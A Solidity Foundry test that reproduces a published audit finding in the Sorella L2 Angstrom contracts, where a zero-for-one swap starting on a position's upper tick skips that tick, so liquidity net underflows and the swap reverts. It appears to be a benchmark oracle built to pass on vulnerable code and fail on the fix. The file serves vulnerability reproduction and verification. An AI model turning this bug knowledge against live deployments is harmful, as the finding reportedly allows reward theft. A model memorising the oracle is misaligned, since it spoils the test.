// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Proof of Vulnerability for finding 63008 (Cyfrin, Sorella L2 Angstrom):
// "All rewards can be stolen due to incorrect active liquidity calculations when
//  the current tick is an exact multiple of the tick spacing at the upper end of
//  a liquidity range."
//
// TickIteratorLib.reset seeds the downward iterator at `startTick` instead of
// `startTick + 1`. Because _advanceToNextDown searches strictly below the current
// tick, a zero-for-one swap that starts exactly on a position's upper boundary
// tick skips that boundary tick. Its net liquidity is never added, so when the
// next initialized tick below is crossed the code subtracts a liquidity net that
// was never added and the subtraction underflows.
//
// This test is the report's Proof of Concept #2. It opens one position [-10, 20)
// and starts a zero-for-one swap on the upper boundary tick (20). When tick 10 is
// crossed, liquidity net is decremented in CompensationPriceFinder.getZeroForOne
// and underflows, so the swap reverts. On the fixed commit the boundary tick is
// no longer skipped, the swap does not revert, and vm.expectRevert makes this
// test fail. That PASS-on-vulnerable / FAIL-on-fix pair is the oracle.
//
// Source: data_collection/tier1_after_2025-08-31/63008.md (published Cyfrin PoC #2).
// Inherits AngstromL2Test to reuse its setUp, helpers (initializePool,
// addLiquidity, getRewards) and the token/angstrom/router state, exactly as the
// published PoC was written. Run scoped with --match-test so the parent suite's
// own tests are not re-run. Runs only offline, against local audited code.

import {AngstromL2Test} from "./AngstromL2.t.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";

contract PoV63008_AngstromL2 is AngstromL2Test {
    using TickMath for int24;

    function test_cyfrin_swapBackwardsFromTickBoundaryAndRevert() public {
        uint256 PRIORITY_FEE = 0.7 gwei;
        PoolKey memory key = initializePool(address(token), 10, 20);
        angstrom.setPoolLPFee(key, 50000);

        addLiquidity(key, -10, 20, 10e21);
        assertEq(getRewards(key, -10, 20), 0);

        bumpBlock();

        setPriorityFee(PRIORITY_FEE);
        // NOTE: this currently reverts when decrementing liquidity net in
        // CompensationPriceFinder::getZeroForOne because the swap begins at the
        // upper tick of the position (20), where Uniswap determines the liquidity
        // is 0. Then, when crossing the next initialized tick (10), it tries to
        // decrement liquidity net by 10e21 which reverts.
        vm.expectRevert();
        router.swap(key, true, -1000e18, int24(-10).getSqrtPriceAtTick());
    }
}
